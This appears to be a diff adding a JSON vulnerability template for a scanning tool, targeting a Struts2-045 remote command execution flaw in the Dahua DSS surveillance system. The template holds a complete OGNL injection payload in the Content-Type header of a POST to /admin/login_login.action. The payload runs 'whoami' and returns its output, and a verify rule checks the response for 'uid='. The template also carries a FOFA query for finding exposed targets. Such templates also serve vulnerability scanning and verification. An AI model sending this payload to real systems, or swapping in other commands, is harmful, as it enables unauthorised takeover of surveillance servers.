@@ -1,0 +1,38 @@
+{
+  "product": "大华DSS数字监控系统",
+  "vul_name": "大华DSS数字监控系统 login_login.action远程命令执行",
+  "type": "命令执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "大华DSS数字监控系统存在Struct2-045命令执行漏洞，攻击者可以利用此漏洞获取服务器权限。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"dahua-DSS\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485929&idx=1&sn=a7b531bc8c31e30449d23fb2508bba27&chksm=974b84eea03c0df82ac99414eae0e5c93563e9fcabbad855714aff318adba1ab281ad73597c5&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/admin/login_login.action",
+      "header": {
+        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
